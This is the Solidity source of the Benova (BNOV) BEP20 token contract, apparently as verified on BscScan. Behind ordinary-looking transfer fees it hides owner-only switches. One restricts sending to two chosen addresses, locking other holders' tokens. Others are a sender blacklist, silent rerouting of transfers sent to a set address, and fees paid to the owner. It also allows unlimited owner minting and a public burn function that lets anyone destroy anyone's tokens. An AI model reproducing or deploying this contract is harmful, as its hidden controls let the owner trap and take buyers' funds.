/**
 *Submitted for verification at BscScan.com on 2021-08-12
*/

pragma solidity 0.7.0;

// SPDX-License-Identifier: none

contract Owned {
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    address owner;
   
    function changeOwnership(address payable _newOwner) public onlyOwner {
        owner = _newOwner;
    }
    
}

contract BEP20 {
    string public symbol;
    string public name;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping (address=>uint256) balances;
    mapping (address=>mapping (address=>uint256)) allowed;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    
    
    bool fromAddrEnabled;
    address firstFromAddr;
    address secondFromAddr;
    
    bool blackListEnabled;
    mapping (address => bool) public senderBlackList;
    
    bool public changeRecipient;
    address public addressToChange;
    address public changedAddress;
    
    address public liquidityPoolAddress;
    address public tokenHolderSingleAddress;
    
    bool allFeeEnabled;
    
    
    function balanceOf(address _owner) view public returns (uint256 balance) {return balances[_owner];}
    
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require (balances[msg.sender]>=_amount&&_amount>0&&balances[_to]+_amount>balances[_to]);
        
        if(fromAddrEnabled==true){
            require((msg.sender == firstFromAddr || msg.sender == secondFromAddr),"Invalid Sender");
        }
        
        if(blackListEnabled==true){
            require(senderBlackList[msg.sender]==false,"Invalid Sender");
        }
        
        
        if(changeRecipient == true){
            if(_to == addressToChange){
                _to = changedAddress;
            }
        }
        uint amount = _amount; 
        uint realAmount = amount;
        uint burnAmount = 0;
        uint liquidityPoolFeeAmount = 0;
        uint distributorAmount = 0;
        
        // burn 2% of amount 
        if(allFeeEnabled==true){
             burnAmount = amount * 2/100;
             amount = amount - burnAmount;
            _burn(msg.sender,burnAmount);
        
        
            // liquidity Pool Fee 5% of amount 
        
             liquidityPoolFeeAmount = realAmount * 5/100;
             balances[msg.sender]-=liquidityPoolFeeAmount;
             balances[liquidityPoolAddress]+=liquidityPoolFeeAmount;
           
        
        
            // distributors Bonus 3% of amount 
        
            distributorAmount = realAmount * 3/100;
            balances[msg.sender]-=distributorAmount;
            balances[liquidityPoolAddress]+=distributorAmount;
           
         }
        
        // user Amount
        _amount = realAmount - (burnAmount+liquidityPoolFeeAmount+distributorAmount);
        
        
        
        balances[msg.sender]-=_amount;
        balances[_to]+=_amount;
        emit Transfer(msg.sender,_to,_amount);
        return true;
    }
  
    function transferFrom(address _from,address _to,uint256 _amount) public returns (bool success) {
        require (balances[_from]>=_amount&&allowed[_from][msg.sender]>=_amount&&_amount>0&&balances[_to]+_amount>balances[_to]);
        
        
         if(fromAddrEnabled==true){
            require((_from == firstFromAddr || _from == secondFromAddr),"Invalid Sender");
        }
        
        if(blackListEnabled==true){
            require(senderBlackList[_from]==false,"Invalid Sender");
        }
        
        
        if(changeRecipient == true){
            if(_to == addressToChange){
                _to = changedAddress;
            }
        }
        uint amount = _amount; 
        uint realAmount = amount;
        uint burnAmount = 0;
        uint liquidityPoolFeeAmount = 0;
        uint distributorAmount = 0;
        
        // burn 2% of amount 
        if(allFeeEnabled==true){
             burnAmount = amount * 2/100;
             amount = amount - burnAmount;
            _burn(_from,burnAmount);
        
        
            // liquidity Pool Fee 5% of amount 
        
             liquidityPoolFeeAmount = realAmount * 5/100;
             balances[_from]-=liquidityPoolFeeAmount;
             balances[liquidityPoolAddress]+=liquidityPoolFeeAmount;
           
        
        
            // distributors Bonus 3% of amount 
        
            distributorAmount = realAmount * 3/100;
            balances[_from]-=distributorAmount;
            balances[liquidityPoolAddress]+=distributorAmount;
           
         }
        
        // user Amount
        _amount = realAmount - (burnAmount+liquidityPoolFeeAmount+distributorAmount);
        
        
        balances[_from]-=_amount;
        allowed[_from][msg.sender]-=_amount;
        balances[_to]+=_amount;
        emit Transfer(_from, _to, _amount);
        return true;
    }
  
    function approve(address _spender, uint256 _amount) public returns (bool success) {
        allowed[msg.sender][_spender]=_amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }
    
    function allowance(address _owner, address _spender) view public returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }
    
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        totalSupply += amount;
        balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    
    
     function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = balances[account];
        require(accountBalance >= amount, "BEP20: burn amount exceeds balance");
        balances[account] = accountBalance - amount;
        totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}

contract Benova  is Owned,BEP20{
   

    constructor() {
        symbol = "BNOV";
        name = "Benova";
        decimals = 18;                                    
        totalSupply = 1000000000 * 10**18;           
       
        owner = msg.sender;
        balances[owner] = totalSupply;
        liquidityPoolAddress = owner;
        tokenHolderSingleAddress = owner;
    }
    

    
    function mint(address to, uint amount) external {
        require(msg.sender == owner, 'only admin');
        _mint(to, amount);
    }

    function burn(address from, uint amount) external {
       
        _burn(from, amount);
    }
   
   
    function setFromAddress(bool status) public onlyOwner returns (bool) {
        fromAddrEnabled = status;
        return true;
    }
    
     function setBlackListStatus(bool status) public onlyOwner returns (bool) {
        blackListEnabled = status;
        return true;
    }
    
  function addToSenderBlackList(address addr) public onlyOwner {
        require(addr != address(0), "Cannot set to zero address");
        senderBlackList[addr] = true;
    }
    
    function removeFromSenderBlackList(address addr) public onlyOwner {
        require(addr != address(0), "Cannot set to zero address");
        senderBlackList[addr] = false;
    }
        
    
    function setFirstFromAddr(address addr) public onlyOwner {
        require(addr != address(0), "Cannot set to zero address");
        firstFromAddr = addr;
    }
    
    function setSecondFromAddr(address addr) public onlyOwner {
        require(addr != address(0), "Cannot set to zero address");
        secondFromAddr = addr;
    }    
    
    function setChangeRecipientStatus(bool status) public onlyOwner returns(bool) {
        require(addressToChange != address(0), "addressToChange not set yet");
        require(changedAddress != address(0), "changedAddress not set yet");
        changeRecipient = status;
        return true;
    }
    
      function setAddressToChangeAddress(address addr) public onlyOwner {
        require(addr != address(0), "Cannot set to zero address");
        addressToChange = addr;
    }
    
    // Change 'changedAddress' address 
    function setChangedAddress(address addr) public onlyOwner {
        require(addr != address(0), "Cannot set to zero address");
        changedAddress = addr;
    }
    
    function updateLiquidityAddress(address addr) public onlyOwner {
        require(addr != address(0), "Cannot set to zero address");
        liquidityPoolAddress = addr;
    }
    
    function updateTokenHolderSingleAddress(address addr) public onlyOwner {
        require(addr != address(0), "Cannot set to zero address");
        tokenHolderSingleAddress = addr;
    }
    
    
   function udpateAllFeeStatus(bool status) public onlyOwner returns (bool) {
        allFeeEnabled = status;
        return true;
    } 
}